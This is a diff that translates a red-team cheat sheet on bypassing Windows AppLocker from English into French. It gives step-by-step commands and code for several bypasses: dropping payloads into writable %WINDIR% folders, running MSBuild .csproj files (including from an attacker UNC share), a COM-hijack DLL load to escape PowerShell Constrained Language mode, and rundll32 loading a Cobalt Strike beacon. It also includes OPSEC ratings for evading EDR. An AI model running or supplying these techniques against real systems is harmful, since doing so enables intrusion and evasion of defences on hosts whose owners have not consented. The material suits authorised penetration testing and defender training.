@@ -1,20 +1,20 @@
 # AppLocker
 
-## Overview
+## Présentation
 
-AppLocker enforces application control via **Allow/Deny rules** scoped to user/group with three condition types:
-- **Publisher** — signed binary's certificate chain
-- **Path** — file or folder path (supports wildcards)
-- **File Hash** — SHA256 of the file
+AppLocker contrôle l’exécution des applications à l’aide de règles **Allow/Deny** appliquées aux utilisateurs ou groupes, selon trois types de conditions :
+- **Publisher** — chaîne de certificats du binaire signé.
+- **Path** — chemin de fichier ou de dossier, avec prise en charge des wildcards.
+- **File Hash** — hash SHA256 du fichier.
 
-**Default rules allow execution from `%PROGRAMFILES%\*` and `%WINDIR%\*` for Everyone.**
-Admins (`BUILTIN\Administrators`) always get a wildcard allow.
+**Les règles par défaut autorisent l’exécution depuis `%PROGRAMFILES%\*` et `%WINDIR%\*` pour Everyone.**
+Les administrateurs (`BUILTIN\Administrators`) disposent d’une autorisation wildcard.
 
 ---
 
-## Policy Enumeration
+## Énumération des politiques
 
-### From Registry (already on target machine)
+### Depuis le Registry de la machine cible
 
 ```powershell
 # Raw registry keys
@@ -25,10 +25,10 @@ $policy = Get-AppLockerPolicy -Effective
 $policy.RuleCollections
 ```
 
-Registry path: `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
-Each subkey = rule type (Exe, Script, Msi, Appx, Dll)
+Chemin Registry : `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
+Chaque sous-clé correspond à un type de règle (Exe, Script, Msi, Appx, Dll).
 
-### From GPO (Beacon on unprotected machine, targeting protected machine)
+### Depuis la GPO (Beacon sur une machine non protégée)
 
 ```cs
 // Step 1 — find the AppLocker GPO by name
@@ -45,7 +45,7 @@ beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{GPO-GUID}\Machine
 Parse-PolFile -Path .\Desktop\Registry.pol
 ```
 
-### Check PowerShell Language Mode (quick AppLocker indicator)
+### Vérifier le PowerShell Language Mode
 
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
@@ -55,7 +55,7 @@ $ExecutionContext.SessionState.LanguageMode
 
 ---
 
-## Bypass Decision Tree
+## Arbre de décision pour le bypass
 
 ```
 1. Enumerate policy → look for:
@@ -68,22 +68,22 @@ $ExecutionContext.SessionState.LanguageMode
 
 ---
 
-## Bypass 1 — Path Wildcard Misconfiguration
+## Bypass 1 — Mauvaise configuration d’une wildcard Path
 
-Look for custom rules where the path anchor is missing (no `%PROGRAMFILES%` or `%WINDIR%` prefix):
+Rechercher les règles personnalisées dont le chemin n’est pas ancré par `%PROGRAMFILES%` ou `%WINDIR%` :
 
 ```xml
 <!-- Vulnerable rule example — ANY folder named App-V is allowed -->
 <FilePathCondition Path="*\App-V\*"/>
 ```
 
-**Exploit:** Create `C:\Users\<user>\App-V\` and drop payload there — it matches the wildcard.
+**Exploitation :** créer `C:\Users\<user>\App-V\` et y placer le payload pour correspondre à la wildcard.
 
 ---
 
-## Bypass 2 — Writable Directories Under `%WINDIR%\*`
+## Bypass 2 — Dossiers accessibles en écriture sous `%WINDIR%\*`
 
-Standard users can write to these paths, which are inside the default allowed zone:
+Selon les permissions locales, des utilisateurs standard peuvent écrire dans certains de ces chemins situés dans une zone autorisée par défaut :
 
 ```
 C:\Windows\Tasks
@@ -94,7 +94,7 @@ C:\Windows\System32\spool\SERVERS
 C:\Windows\System32\spool\drivers\color
 ```
 
-**Exploit:** Drop executable/script/installer into one of these → run directly.
+**Exploitation :** déposer un exécutable, script ou installer dans un chemin autorisé, puis l’exécuter.
 
 ```powershell
 # Find additional writable dirs under Windows
@@ -104,11 +104,11 @@ icacls C:\Windows\Tasks
 
 ---
 
-## Bypass 3 — LOLBAS (MSBuild)
+## Bypass 3 — LOLBAS avec MSBuild
 
-`MSBuild.exe` lives in `%WINDIR%\Microsoft.NET\Framework\v4.0.30319\` — always allowed. Executes arbitrary C# from a `.csproj` file.
+`MSBuild.exe` se trouve dans `%WINDIR%\Microsoft.NET\Framework\v4.0.30319\` : ce chemin est généralement autorisé par les règles par défaut. MSBuild exécute du code C# contenu dans un fichier `.csproj`.
 
-**Step 1 — Create `bypass.csproj`:**
+**Étape 1 — Créer `bypass.csproj` :**
 
 ```xml
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
@@ -142,30 +142,30 @@ icacls C:\Windows\Tasks
 </Project>
 ```
 
-**Step 2 — Execute:**
+**Étape 2 — Exécuter :**
 
 ```cmd
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe bypass.csproj
 ```
 
-> **OPSEC-CAUTION:** MSBuild spawning child processes is signatured by modern EDR. Inline shellcode execution within the Task is stealthier than launching new processes.
+> **OPSEC-CAUTION:** L’exécution de child processes par MSBuild est détectable par les EDR modernes. L’exécution inline dans la Task n’a pas le même profil de détection que la création de nouveaux processus.
 
 ---
 
-## Bypass 4 — PowerShell CLM via Custom COM Object
+## Bypass 4 — PowerShell CLM via un objet COM personnalisé
 
-AppLocker forces PowerShell into `ConstrainedLanguage` mode — no arbitrary .NET API calls. However, `New-Object -ComObject` still works.
+AppLocker peut contraindre PowerShell au mode `ConstrainedLanguage`, qui restreint certains appels aux API .NET. Dans le scénario décrit, `New-Object -ComObject` reste utilisable.
 
-**Technique:** Register a fake COM CLSID in HKCU pointing to your DLL → load it via `New-Object`.
+**Technique :** enregistrer un CLSID COM dans HKCU pointant vers une DLL, puis charger celle-ci via `New-Object`.
 
-**Step 1 — Generate a GUID:**
+**Étape 1 — Générer un GUID :**
 
 ```powershell
 [System.Guid]::NewGuid()
 # Example output: 6136e053-47cb-4fdd-84b1-381bc5f3edb3
 ```
 
-**Step 2 — Register the COM object (HKCU — no admin needed):**
+**Étape 2 — Enregistrer l’objet COM dans HKCU (sans privilèges admin) :**
 
 ```powershell
 $guid = '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
@@ -179,7 +179,7 @@ New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocke
 New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value $guid
 ```
 
-**Step 3 — Trigger DLL load:**
+**Étape 3 — Déclencher le chargement de la DLL :**
 
 ```powershell
 New-Object -ComObject AppLocker.Bypass
@@ -202,25 +202,25 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 }
 ```
 
-> **OPSEC-SAFE:** Runs inside the PowerShell process — no child process spawned. HKCU registry write only (no admin). DLL must be in an AppLocker-allowed path (use writable %WINDIR% subdir).
+> **OPSEC-SAFE:** L’exécution se fait dans le processus PowerShell, sans child process. Seules des écritures dans HKCU sont requises. La DLL doit se trouver dans un chemin autorisé par AppLocker.
 
 ---
 
-## Bypass 5 — rundll32 (DLL Rules Disabled)
+## Bypass 5 — rundll32 lorsque les règles DLL sont désactivées
 
-DLL enforcement rules are **off by default** due to performance impact. When disabled, `rundll32` can load any DLL regardless of AppLocker.
+Les règles d’application aux DLL sont **désactivées par défaut** dans de nombreuses configurations pour des raisons de performance. Lorsqu’elles sont inactives, `rundll32` peut charger une DLL sans contrôle AppLocker sur celle-ci.
 
-`rundll32.exe` lives in `%WINDIR%\System32\` — always allowed.
+`rundll32.exe` se trouve sous `%WINDIR%\System32\`, généralement autorisé par les règles standard.
 
-**Cobalt Strike Beacon DLL payload exports `StartW`:**
+**Le payload DLL Beacon de Cobalt Strike exporte `StartW` :**
 
 ```cmd
 rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 ```
 
-> **OPSEC-CAUTION:** `rundll32` is heavily monitored by EDR. Ensure `spawnto` and malleable profile are set. Consider hollowing rundll32 or using a stealthier loader.
+> **OPSEC-CAUTION:** `rundll32` est fortement surveillé par les EDR. Vérifier la configuration `spawnto` et du Malleable C2 Profile ; évaluer les risques de détection.
 
-Verify DLL rules are disabled first:
+Vérifier d’abord que les règles DLL sont désactivées :
 
 ```powershell
 $policy = Get-AppLockerPolicy -Effective
@@ -230,11 +230,11 @@ $policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }
 
 ---
 
-## AppLocker Challenge — Methodology (No Instructions Provided)
+## Challenge AppLocker — Méthodologie
 
-Work through this checklist sequentially. Each step narrows the bypass path.
+Suivre cette checklist dans l’ordre pour identifier les possibilités de bypass.
 
-### Step 1 — Check if AppLocker is Active
+### Étape 1 — Vérifier si AppLocker est actif
 
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
@@ -242,7 +242,7 @@ $ExecutionContext.SessionState.LanguageMode
 Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 ```
 
-### Step 2 — Enumerate All Rules
+### Étape 2 — Énumérer toutes les règles
 
 ```powershell
 $policy = Get-AppLockerPolicy -Effective
@@ -250,14 +250,14 @@ $policy.RuleCollections | Format-List *
 # Look for: custom path rules with loose wildcards, missing rule types (DLL = off?)
 ```
 
-### Step 3 — Check DLL Rule Enforcement
+### Étape 3 — Vérifier les règles DLL
 
 ```powershell
 $policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }
 # Empty → rundll32 bypass available → go to Bypass 5
 ```
 
-### Step 4 — Check for Writable Paths Under Allowed Dirs
+### Étape 4 — Vérifier les chemins autorisés accessibles en écriture
 
 ```cmd
 icacls C:\Windows\Tasks
@@ -267,22 +267,22 @@ icacls C:\Windows\Tracing
 
 If writable → drop payload (exe, script, DLL) → execute directly.
 
-### Step 5 — Check for Path Wildcard Misconfigs
+### Étape 5 — Rechercher les wildcard Path mal configurées
 
 ```powershell
 $policy.RuleCollections | ForEach-Object { $_.Rules } | Where-Object { $_ -is [Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.FilePathRule] } | Select-Object Name, Conditions
 # Look for rules where path starts with * (not anchored to %WINDIR% or %PROGRAMFILES%)
 ```
 
-Create a matching directory and execute from there.
+Créer un dossier correspondant à la règle, puis exécuter depuis ce chemin.
 
-### Step 6 — CLM Bypass via COM (if PS is constrained)
+### Étape 6 — Bypass CLM via COM (si PowerShell est contraint)
 
-Use Bypass 4 above. Required: a DLL you can write to an allowed path.
+Utiliser le Bypass 4 décrit plus haut. Il faut pouvoir écrire une DLL dans un chemin autorisé.
 
-### Step 7 — MSBuild LOLBAS
+### Étape 7 — MSBuild LOLBAS
 
-If you can write a `.csproj` file anywhere (doesn't need to be in an allowed path — MSBuild reads it as data, not executes it directly):
+Si un fichier `.csproj` peut être écrit sur disque (son chemin n’a pas nécessairement besoin d’être autorisé, car MSBuild le lit comme donnée) :
 
 ```cmd
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\attacker\share\bypass.csproj
@@ -290,9 +290,9 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\attacker\share\bypas
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Tasks\bypass.csproj
 ```
 
-### Step 8 — Cobalt Strike Beacon via Allowed Path
+### Étape 8 — Beacon Cobalt Strike depuis un chemin autorisé
 
-If you already have a Beacon and need to migrate/stage a new one on the AppLocker-protected host:
+Si un Beacon est déjà présent et qu’il faut migrer ou préparer un nouvel implant sur un hôte protégé par AppLocker :
 
 ```cs
 // Option A: rundll32 (DLL rules off)
@@ -305,24 +305,24 @@ beacon> shell C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windo
 beacon> execute-assembly C:\Tools\tool.exe
 ```
 
-> `execute-assembly` loads .NET assemblies **into Beacon's memory** — AppLocker does not apply. Use this to run SharpHound, Rubeus, etc. on AppLocker-protected hosts.
+> `execute-assembly` charge des assemblies .NET en mémoire dans le contexte d’exécution du Beacon. Le contrôle AppLocker ne s’applique pas de la même manière que lors du lancement d’un exécutable classique.
 
 ---
 
-## OPSEC Summary
+## Récapitulatif OPSEC
 
-| Technique | OPSEC | Notes |
+| Technique | OPSEC | Remarques |
 |-----------|-------|-------|
-| Writable %WINDIR% dir | CAUTION | Drops file to disk in monitored path |
-| MSBuild .csproj | CAUTION | MSBuild spawning code is EDR-visible |
-| rundll32 DLL load | CAUTION | rundll32 heavily scrutinised by EDR |
-| COM CLM bypass | SAFE | In-process DLL load, HKCU only, no child proc |
-| execute-assembly | SAFE | In-memory, bypasses AppLocker entirely |
-| Path wildcard abuse | SAFE | No new files if payload already staged |
+| Dossier `%WINDIR%` en écriture | CAUTION | Dépose un fichier dans un chemin potentiellement surveillé |
+| MSBuild `.csproj` | CAUTION | Exécution de code MSBuild visible pour l’EDR |
+| Chargement DLL par rundll32 | CAUTION | rundll32 fortement surveillé par l’EDR |
+| Bypass COM CLM | SAFE | Chargement DLL dans le processus, HKCU uniquement |
+| execute-assembly | SAFE | Chargement en mémoire dans le processus Beacon |
+| Abus de wildcard Path | SAFE | Aucun nouveau fichier si le payload est déjà présent |
 
 ---
 
-## Quick Reference
+## Référence rapide
 
 ```
 ENUMERATE:   Get-AppLockerPolicy -Effective | Select -Expand RuleCollections
